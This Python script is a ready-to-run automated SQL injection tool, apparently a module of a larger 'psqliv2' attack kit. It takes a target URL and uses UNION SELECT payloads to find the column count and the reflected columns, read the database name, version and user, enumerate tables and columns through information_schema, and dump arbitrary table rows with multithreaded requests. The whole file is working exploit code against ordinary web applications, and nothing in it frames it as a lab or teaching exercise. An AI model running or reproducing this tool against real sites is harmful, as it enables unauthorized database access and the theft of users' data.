#!/usr/bin/env python3
"""
Plain SQL Injection Module - No WAF bypass, clean UNION SELECT payloads.
Called from psqliv2.sh when user selects "Force Plain Mode" (option 5/6).

Auto-detects OS: uses stdlib on Termux/Android, optional requests/bs4 on Linux.

Usage: python3 plain_inject.py <url> [cached_cols] [enum_only|dump] [table_name] [columns]

Structured output on stdout (for bash parsing):
  REFLECTED=3,12,13,14
  DATABASE=somedb
  VERSION=8.0.42
  USER=root@localhost
  TABLE=users
  COLUMN=users::id
  DONE=1
"""

import sys
import os
import re
import json
import ssl
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ── Auto-detect environment ──────────────────────────────────────────
IS_TERMUX = (
    os.path.exists("/data/data/com.termux")
    or "TERMUX" in os.environ.get("PREFIX", "").upper()
    or "com.termux" in os.environ.get("HOME", "")
    or platform.machine() in ("aarch64", "armv7l", "armv8l")
    and os.path.isdir("/data/data")
)

# Try to import external libs; fall back to stdlib if unavailable
_USE_REQUESTS = False
_USE_BS4 = False

if not IS_TERMUX:
    try:
        import requests as _requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        _USE_REQUESTS = True
    except ImportError:
        pass
    try:
        from bs4 import BeautifulSoup
        _USE_BS4 = True
    except ImportError:
        pass

# stdlib fallback
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from html.parser import HTMLParser

TIMEOUT = 15
UA = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"

# Create SSL context that ignores cert errors (like verify=False)
_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE

# If using requests, create a session
if _USE_REQUESTS:
    _session = _requests.Session()
    _session.headers.update({"User-Agent": UA})
    _session.verify = False


def log(msg):
    print(msg, file=sys.stderr, flush=True)


# ── HTML tag stripper (stdlib) ───────────────────────────────────────
class _TagStripper(HTMLParser):
    def __init__(self):
        super().__init__()
        self._parts = []

    def handle_data(self, data):
        self._parts.append(data)

    def get_text(self):
        return " ".join(self._parts)


def _strip_tags(html):
    """Remove HTML tags using stdlib HTMLParser."""
    s = _TagStripper()
    try:
        s.feed(html)
        return s.get_text()
    except Exception:
        return re.sub(r'<[^>]+>', ' ', html)


# ── Networking ───────────────────────────────────────────────────────
def fetch(url):
    """Fetch URL text. Uses requests if available, else stdlib."""
    if _USE_REQUESTS:
        try:
            resp = _session.get(url, timeout=TIMEOUT, allow_redirects=True)
            resp.encoding = resp.apparent_encoding if resp.encoding == 'ISO-8859-1' else resp.encoding
            return resp.text
        except Exception:
            return ""
    else:
        try:
            req = Request(url, headers={"User-Agent": UA})
            with urlopen(req, timeout=TIMEOUT, context=_ssl_ctx) as resp:
                data = resp.read()
                # Try utf-8 first, then latin-1 as safe fallback
                try:
                    return data.decode("utf-8")
                except UnicodeDecodeError:
                    return data.decode("latin-1")
        except (URLError, HTTPError, OSError, Exception):
            return ""


def get_clean_text(html):
    """Extract pure text from HTML. Uses BeautifulSoup if available, else stdlib."""
    if not html:
        return ""
    if _USE_BS4:
        try:
            soup = BeautifulSoup(html, "lxml")
            return " ".join(soup.stripped_strings)
        except Exception:
            return _strip_tags(html)
    else:
        return _strip_tags(html)


# ── Core injection logic ────────────────────────────────────────────
def find_column_count(base_url):
    log("[*] Scanning column count with ORDER BY...")
    for i in range(1, 81):
        url = f"{base_url}%20ORDER%20BY%20{i}%20--+"
        resp = fetch(url)
        clean = get_clean_text(resp).lower()
        if "unknown column" in clean or "1054" in clean or "order clause" in clean:
            cols = i - 1
            log(f"[+] Column count: {cols}")
            return cols
    log("[!] Could not determine column count via ORDER BY")
    return 0


def find_reflected_columns(base_url, ncols):
    log("[*] Finding reflected columns (single request)...")
    cols = [f"concat(0x7e7e,{i},0x7e7e)" for i in range(1, ncols + 1)]
    url = f"{base_url}%20UNION%20SELECT%20{','.join(cols)}%20--+"
    log(f"[*] URL: {url}")

    resp = fetch(url)
    clean_text = get_clean_text(resp)

    reflected = []
    for i in range(1, ncols + 1):
        if f"~~{i}~~" in resp or f"~~{i}~~" in clean_text:
            log(f"  [+] Column {i} reflects!")
            reflected.append(i)
    return reflected


def extract_db_info(base_url, ncols, reflected_cols):
    for refl_col in reflected_cols:
        log(f"[*] Extracting DB info via column {refl_col}...")
        cols = []
        for i in range(1, ncols + 1):
            if i == refl_col:
                cols.append("concat(0x7e7e,database(),0x7c7c,version(),0x7c7c,user(),0x7e7e)")
            else:
                cols.append("1")

        url = f"{base_url}%20UNION%20SELECT%20{','.join(cols)}%20--+"
        resp = fetch(url)
        clean_text = get_clean_text(resp)

        for text_source in [clean_text, resp]:
            m = re.search(r'~~(.*?)\|\|(.*?)\|\|(.*?)~~', text_source)
            if m:
                db_name = m.group(1).strip()
                ver = m.group(2).strip()
                user = m.group(3).strip()
                if db_name and "<" not in db_name and "SELECT" not in db_name.upper():
                    log(f"  [+] Clean extraction from column {refl_col}")
                    return db_name, ver, user, refl_col
    return None, None, None, None


def _fetch_table_chunk(base_url, ncols, refl_col, hex_db, offset):
    cols = []
    for i in range(1, ncols + 1):
        if i == refl_col:
            cols.append("concat(0x7e7e,table_name,0x7e7e)")
        else:
            cols.append("1")

    url = (f"{base_url}%20UNION%20SELECT%20{','.join(cols)}"
           f"%20FROM%20information_schema.tables"
           f"%20WHERE%20table_schema={hex_db}"
           f"%20LIMIT%20{offset},1%20--+")
    resp = fetch(url)
    clean_text = get_clean_text(resp)
    m = re.search(r'~~([^~]+)~~', clean_text) or re.search(r'~~([^~]+)~~', resp)
    if m:
        t = m.group(1).strip()
        if "<" not in t:
            return offset, t
    return offset, None


def enumerate_tables(base_url, ncols, refl_col, db_name):
    log(f"[*] Enumerating tables in '{db_name}'...")
    hex_db = "0x" + db_name.encode().hex()
    tables = []

    # Adjust worker count for Termux (fewer resources)
    workers = 5 if IS_TERMUX else 10

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(_fetch_table_chunk, base_url, ncols, refl_col, hex_db, offset): offset for offset in range(200)}
        results = {}
        empty_count = 0

        for future in as_completed(futures):
            offset, t = future.result()
            if t:
                results[offset] = t
                log(f"  ~ {t}")
            else:
                empty_count += 1
                if empty_count > 50:
                    for f in futures:
                        f.cancel()
                    break

    for offset in sorted(results.keys()):
        tables.append(results[offset])

    return tables


def _fetch_column_chunk(base_url, ncols, refl_col, hex_db, hex_tbl, offset):
    cols = []
    for i in range(1, ncols + 1):
        if i == refl_col:
            cols.append("concat(0x7e7e,column_name,0x7e7e)")
        else:
            cols.append("1")

    url = (f"{base_url}%20UNION%20SELECT%20{','.join(cols)}"
           f"%20FROM%20information_schema.columns"
           f"%20WHERE%20table_schema={hex_db}%20AND%20table_name={hex_tbl}"
           f"%20LIMIT%20{offset},1%20--+")
    resp = fetch(url)
    clean_text = get_clean_text(resp)
    m = re.search(r'~~([^~]+)~~', clean_text) or re.search(r'~~([^~]+)~~', resp)
    if m:
        c = m.group(1).strip()
        if "<" not in c:
            return offset, c
    return offset, None


def _fetch_dump_chunk(base_url, ncols, refl_col, db_name, table_name, concat_cols, offset):
    cols = []
    for i in range(1, ncols + 1):
        if i == refl_col:
            cols.append(f"concat(0x7e7e,{concat_cols},0x7e7e)")
        else:
            cols.append("1")

    url = (f"{base_url}%20UNION%20SELECT%20{','.join(cols)}"
           f"%20FROM%20`{db_name}`.`{table_name}`"
           f"%20LIMIT%20{offset},1%20--+")
    resp = fetch(url)
    clean_text = get_clean_text(resp)
    m = re.search(r'~~(.*?)~~', clean_text) or re.search(r'~~(.*?)~~', resp)
    if m:
        row_data = m.group(1).strip()
        if "<" not in row_data:
            parts = row_data.split('::')
            parts = [p if p else ' ' for p in parts]
            row_data = '::'.join(parts)
            return offset, row_data
    return offset, None


def dump_columns(base_url, ncols, refl_col, db_name, table_name, columns_str):
    log(f"[*] Dumping columns '{columns_str}' from '{table_name}'...")
    cols_wrapped = [f"IFNULL({c.strip()},' ')" for c in columns_str.split(',')]
    concat_cols = ",0x3a3a,".join(cols_wrapped)

    workers = 5 if IS_TERMUX else 10
    dumped_rows = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(_fetch_dump_chunk, base_url, ncols, refl_col, db_name, table_name, concat_cols, offset): offset for offset in range(1000)}
        results = {}
        empty_count = 0

        for future in as_completed(futures):
            offset, row = future.result()
            if row:
                results[offset] = row
            else:
                empty_count += 1
                if empty_count > 50:
                    for f in futures:
                        f.cancel()
                    break

    for offset in sorted(results.keys()):
        dumped_rows.append(results[offset])

    return dumped_rows


def enumerate_columns(base_url, ncols, refl_col, db_name, table_name):
    hex_db = "0x" + db_name.encode().hex()
    hex_tbl = "0x" + table_name.encode().hex()
    columns = []

    workers = 5 if IS_TERMUX else 10
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(_fetch_column_chunk, base_url, ncols, refl_col, hex_db, hex_tbl, offset): offset for offset in range(100)}
        results = {}
        empty_count = 0

        for future in as_completed(futures):
            offset, c = future.result()
            if c:
                results[offset] = c
            else:
                empty_count += 1
                if empty_count > 20:
                    for f in futures:
                        f.cancel()
                    break

    for offset in sorted(results.keys()):
        columns.append(results[offset])

    return columns


# ── Main ─────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) < 2:
        log("Usage:")
        log("  python3 plain_inject.py <url> <cached_cols> [enum_only|dump] [table_name] [columns]")
        sys.exit(1)

    base_url = sys.argv[1]
    cached_cols = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 0
    mode = sys.argv[3] if len(sys.argv) > 3 else "enum_only"

    # Show environment info
    env_label = "Termux/Android (stdlib)" if IS_TERMUX else "Linux"
    if _USE_REQUESTS:
        env_label += " + requests"
    if _USE_BS4:
        env_label += " + bs4"

    # Cache setup
    import hashlib
    try:
        domain = urlparse(base_url).netloc or base_url
    except Exception:
        domain = base_url
    url_hash = hashlib.md5(domain.encode()).hexdigest()
    cache_file = f"/tmp/.plain_cache_{url_hash}.json"
    cache_data = {}
    if os.path.exists(cache_file):
        try:
            with open(cache_file, "r") as f:
                cache_data = json.load(f)
        except Exception:
            pass

    log(f"\n{'='*50}")
    log(f"  PLAIN INJECT [{env_label}]")
    log(f"  Target: {base_url}")
    log(f"{'='*50}\n")

    # 1. Column count
    ncols = cached_cols if cached_cols > 2 else find_column_count(base_url)
    if ncols > 2:
        log(f"[+] Using column count: {ncols}")
    else:
        print("ERROR=Could not determine column count")
        sys.exit(1)

    # 2. Find reflected columns
    reflected = find_reflected_columns(base_url, ncols)
    if not reflected:
        print("ERROR=No reflected columns found")
        sys.exit(1)

    print(f"REFLECTED={','.join(str(x) for x in reflected)}")

    # 3. DB info
    if "db_name" in cache_data and "db_ver" in cache_data and "db_user" in cache_data and "working_col" in cache_data:
        db_name = cache_data["db_name"]
        db_ver = cache_data["db_ver"]
        db_user = cache_data["db_user"]
        working_col = cache_data["working_col"]
    else:
        db_name, db_ver, db_user, working_col = extract_db_info(base_url, ncols, reflected)
        if not db_name:
            print("ERROR=Failed to cleanly extract database info")
            sys.exit(1)
        cache_data["db_name"] = db_name
        cache_data["db_ver"] = db_ver
        cache_data["db_user"] = db_user
        cache_data["working_col"] = working_col
        with open(cache_file, "w") as f:
            json.dump(cache_data, f)

    print(f"DATABASE={db_name}")
    print(f"VERSION={db_ver}")
    print(f"USER={db_user}")

    log(f"\n[+] Database : {db_name}")
    log(f"[+] Version  : {db_ver}")
    log(f"[+] User     : {db_user}\n")

    if mode == "dump":
        if len(sys.argv) < 6:
            log("[!] Missing table/columns for dump mode")
            sys.exit(1)
        target_table = sys.argv[4]
        target_cols = sys.argv[5]

        rows = dump_columns(base_url, ncols, working_col, db_name, target_table, target_cols)
        for r in rows:
            print(f"DUMP={r}")
        print("DONE=1")
        sys.exit(0)

    # 4. Enumerate tables
    if "tables" in cache_data:
        log("[+] Loading tables from cache...")
        tables = cache_data["tables"]
    else:
        tables = enumerate_tables(base_url, ncols, working_col, db_name)
        cache_data["tables"] = tables
        with open(cache_file, "w") as f:
            json.dump(cache_data, f)

    for t in tables:
        print(f"TABLE={t}")

    # 5. Enumerate columns for each table
    if tables:
        if "columns" in cache_data:
            log("[+] Loading columns from cache...")
            columns_map = cache_data["columns"]
            for t, tcols in columns_map.items():
                for c in tcols:
                    print(f"COLUMN={t}::{c}")
        else:
            log(f"\n[*] Enumerating columns...")
            columns_map = {}
            for t in tables:
                log(f"\n  Table: {t}")
                tcols = enumerate_columns(base_url, ncols, working_col, db_name, t)
                columns_map[t] = tcols
                for c in tcols:
                    log(f"    - {c}")
                    print(f"COLUMN={t}::{c}")
            cache_data["columns"] = columns_map
            with open(cache_file, "w") as f:
                json.dump(cache_data, f)

    print("DONE=1")
    log(f"\n{'='*50}")
    log("[+] Plain inject complete!")
    log(f"{'='*50}")


if __name__ == "__main__":
    main()
